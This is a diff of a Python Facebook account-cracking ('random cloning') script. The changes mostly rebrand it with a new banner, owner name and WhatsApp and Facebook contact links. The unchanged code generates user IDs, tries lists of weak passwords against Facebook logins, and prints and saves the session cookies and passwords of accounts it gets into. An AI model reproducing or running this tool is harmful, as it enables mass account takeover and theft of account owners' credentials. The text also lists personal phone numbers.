@@ -121,25 +121,20 @@ def jalan(z):
         time.sleep(0.01)
 
   
-logo=(""" ABAL Shahjahan OPEN SOURCH \033[1;37m
-\33[1;92m███    ███ \033[1;34m █████ \033[1;93m ██   ██\033[1;91m  █████\033[1;35m  ██████  \033[1;36m██
-\33[1;92m████  ████ \033[1;34m██   ██\033[1;93m ██   ██ \033[1;91m██   ██ \033[1;35m██   ██ \033[1;36m██
-\33[1;92m██ ████ ██\033[1;34m ███████\033[1;93m ███████\033[1;91m ███████ \033[1;35m██   ██ \033[1;36m██
-\33[1;92m██  ██  ██ \033[1;34m██   ██\033[1;93m ██   ██\033[1;91m ██   ██\033[1;35m ██   ██ \033[1;36m██
-\33[1;92m██      ██\033[1;34m ██   ██\033[1;93m ██   ██\033[1;91m ██   ██\033[1;35m ██████  \033[1;36m██     
-\33[1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗               
-║  \x1b[97m\033[37;41m Welcome to my Shahjahan Tools                          \033[0;m  ║
-\33[1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝                      
-\33[1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗               
-║  \x1b[97m\033[37;41m  FREE BANGLADESHI RANDOM CLONING V15 \033[0;m    ║
-\33[1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝            
-\33[1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
-\33[1;92m║➣\033[1;91m DEVOLPER   :          Shahjahan \33[1;92m║               
-\33[1;92m║➣ FACEBOOK   :          Shahjahan \33[1;92m║                 
-\33[1;92m║➣\033[1;93m WHATSAPP   :          03236007212        \33[1;92m ║
-\33[1;92m║➣\033[1;34m GITHUB     :          Shahjahan-143         \33[1;92m ║          
-\33[1;92m║➣\033[1;35m TOOLS      :          BD RANDOM CRACKING \33[1;92m ║                 
-\33[1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
+logo=("""
+\33[1;92m███████ ██    ██ ██   ██  █████  
+\33[1;92m██      ██    ██ ██   ██ ██   ██ 
+\33[1;92m███████ ██    ██ ███████ ███████ 
+\33[1;92m     ██ ██    ██ ██   ██ ██   ██ 
+\33[1;92m███████  ██████  ██   ██ ██   ██ 
+\033[1;36m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;37m
+\033[1;37m Owner   :            MD JAKARIA FIAD
+\033[1;37m Facebook:            MD JAKARIA FIAD
+\033[1;37m Github  :            S-JK404
+\033[1;37m Whatsapp:            +8801791023760
+\033[1;37m Tool    :            \033[1;37mRANDOM CLONE
+\033[1;36m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;37m                    
+
 """)
 def cek_apk(session,coki):
 	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
@@ -166,23 +161,15 @@ def cek_apk(session,coki):
 def Main():
 	os.system('clear')
 	print(logo)
-	print("[\033[1;37m01\33[1;92m][\033[1;93mA\33[1;92m] START RANDOM CLONING")
-	print("[\033[1;37m02\33[1;92m][\033[1;93mB\33[1;92m] FOLLOW MY FB ACCOUNT")
-	print("[\033[1;37m03\33[1;92m][\033[1;93mC\33[1;92m] CONTACT ME ON FB")
-	print("[\033[1;37m04\33[1;92m][\033[1;93mD\33[1;92m] MY WHATSAPP")
-	print('[\033[1;37m00\33[1;92m][\033[1;93mE\33[1;92m] EXIT PROGRAMMING')
+	print("[\033[1;37m01\33[1;92m][\033[1;93mA\33[1;92m] RANDOM CLONING")
+	print("[\033[1;37m02\33[1;92m][\033[1;93mB\33[1;92m] CONTACT ADMIN")
+	print('[\033[1;37m00\33[1;92m][\033[1;93mE\33[1;92m] EXIT PROGRAMM')
 	print(54*'━')
 	opt = input('Choose option >>> ')
 	if opt in ["A","1"]:
 		virusA()
 	if opt in ["B","2"]:
 		admin()
-	if opt in ["C","3"]:
-		os.system('xdg-open https://www.facebook.com/shahjahanrajpot.shahjahanrajpot');time.sleep(1)
-		fb()
-	if opt in ["D","4"]:
-		os.system('xdg-open https://wa.me/+03236007212');time.sleep(1)
-		group()
 	if opt in ["0","0"]:
 		exit()
 		
@@ -194,18 +181,14 @@ def admin():
 	print(logo)
 	print(50*'_')
 	print(' [1] Contract WhatsApp ')
-	print(' [2] FOLLOW MY FB PAGE ')
-	print(' [3] Subscribe Youtube')
+	print(' [2] Contact Me On Facebook ')
 	print(' [0] Back to Main menu')
 	bal = input('Choose option >>> ')
 	if bal =='1':
-		os.system('xdg-open https://wa.me/+03236007212');time.sleep(1)
+		os.system('xdg-open https://wa.me/+8801791023760');time.sleep(1)
 		admin()
 	if bal =='2':
-		os.system('xdg-open https://www.facebook.com/shahjahanrajpot.shahjahanrajpot');time.sleep(1)
-		admin()
-	if bal =='3':
-		os.system('xdg-open https://youtube.com');time.sleep(1)
+		os.system('xdg-open https://www.facebook.com/mdjakaria.fiad');time.sleep(1)
 		admin()
 	if bal =='0':
 		Main()
@@ -237,9 +220,9 @@ def virusA():
 			uid = kode+koda+kodb+guru
 			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','FREE FIRE','free fire','i love you']
 			yaari.submit(b,uid,pwx,tl)
-	print(50*'_')
-	print(' [💉] Crack process has been completed')
-	print(' [💉] Ids saved in ok.txt,cp.txt')
+	print(50*'▬')
+	print(' [🚀] Crack process has been completed')
+	print(' [🚀] Ids saved in ok.txt,cp.txt')
 	print(50*'_')
 	exit()
 
@@ -251,7 +234,7 @@ def b(uid,pwx,tl):
     try:
         for ps in pwx:
             session = requests.Session()
-            sys.stdout.write(f'\r \033[1;90m[\033[1;93mJAHID\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
+            sys.stdout.write(f'\r \033[1;90m[\033[1;93mSUHA\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
             sys.stdout.flush()
             pro = random.choice(ugen)
             #oo=random.choice(sss)
@@ -287,10 +270,10 @@ def b(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print(f'\r\33[1;92m [Shahjahan-💚] '+cid+' | '+ps+'\33[0;92m')
-                print(f'\r\033[1;92m=[💙]=COOKIE : '+coki)
+                print(f'\r\33[1;92m [SUHA-💞] '+cid+' | '+ps+'\33[0;92m')
+                print(f'\r\033[1;92m=[🍪]=COOKIE : '+coki)
                 oks.append(cid)
-                open('/sdcard/jahidok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
+                open('/sdcard/SUHAok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                 break
             else:
                 continue
